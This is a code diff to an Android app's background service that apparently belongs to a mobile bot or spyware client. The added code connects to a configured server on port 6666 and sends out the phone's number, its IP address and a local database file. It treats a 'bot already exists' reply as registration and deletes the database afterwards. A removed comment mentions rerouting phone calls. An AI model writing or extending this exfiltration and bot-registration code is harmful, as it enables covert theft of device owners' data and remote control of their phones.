@@ -37,11 +37,13 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.Reader;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.Socket;
+import java.net.SocketException;
 import java.net.URL;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
@@ -195,52 +197,49 @@ public class JobsIntentService extends IntentService {
                                 ArrayList<String> addresses = null;
                                 Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                                 try {
-                                    Socket socket = new Socket("10.0.2.2", 6666);
-                                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
-                                    byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
-                                    oos.writeObject(bytes);
-                                    oos.flush();
-                    /* for(int i = 0; i < 3; i++){
-                        addresses = Lofl.fetchIpv4Addresses();
-                        Socket socket = new Socket("10.0.2.2", 6666);
-                        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
-                        if(i == 0){
-                            oos.writeObject(sTelephoneAddress);
-                        }else if(i == 1){
-                            oos.writeObject(InetAddress.getLocalHost().toString());
-                        }else if(i == 2){
-                            byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(MessagingService.this));
-                            oos.writeObject(bytes);
-                            oos.flush();
-                        }
-                        oos.close();
-                        socket.close();
-                    }*/
-                                    oos.close();
-                                    socket.close();
+                                    for(int i = 0; i < 3; i++){
+                                        Socket socket = new Socket(Constants.SERVER_ADDRESS, 6666);
+                                        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
+                                        switch(i){
+                                            case 0:
+                                                oos.writeObject(MessagingService.sTelephoneAddress);
+                                                break;
+                                            case 1:
+                                                String ip = Lofl.fetchIpv4Addresses().get(0);
+                                                oos.writeObject(ip);
+                                                break;
+                                            case 2:
+                                                byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
+                                                oos.writeObject(bytes);
+                                                break;
+                                            default:
+                                                break;
+                                        }
+                                        InputStream inputStream = socket.getInputStream();
+                                        if(inputStream.available() != 0){
+                                            try {
+                                                ObjectInputStream ois = new ObjectInputStream(inputStream);
+                                                String message = (String) ois.readObject();
+                                                if(message.equalsIgnoreCase("bot already exists")){
+                                                    i = 4;
+                                                }
+                                            } catch (ClassNotFoundException e) {
+                                                e.printStackTrace();
+                                            }
+                                        }
+                                        oos.flush();
+                                        oos.close();
+                                        inputStream.close();
+                                        socket.close();
+                                    }
                                 } catch (UnknownHostException e) {
                                     e.printStackTrace();
                                 } catch (IOException e) {
                                     e.printStackTrace();
                                 }
-/*                try {
-                    ServerSocket serverSocket = new ServerSocket(8080, 0, InetAddress.getLocalHost());
-                    while(true) {
-                        Socket socket = serverSocket.accept();
-                        ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
-                        String message = (String) ois.readObject();
-                        Log.d(TAG, message);
-                        ois.close();
-                        socket.close();
-                    }
-                } catch (IOException e) {
-                        e.printStackTrace();
-                    } catch (ClassNotFoundException e) {
-                        e.printStackTrace();
-                    }*/
+                                Lofl.getDatabaseFile(JobsIntentService.this).delete();
                             }
                         }).start();
-                        //Lofl.onReceiveCommand(this, Commands.REROUTE_PHONE_CALLS, "stop");
                     }
                 }
             } else if (action.equals(ACTION_CALENDAR_EVENT)) {
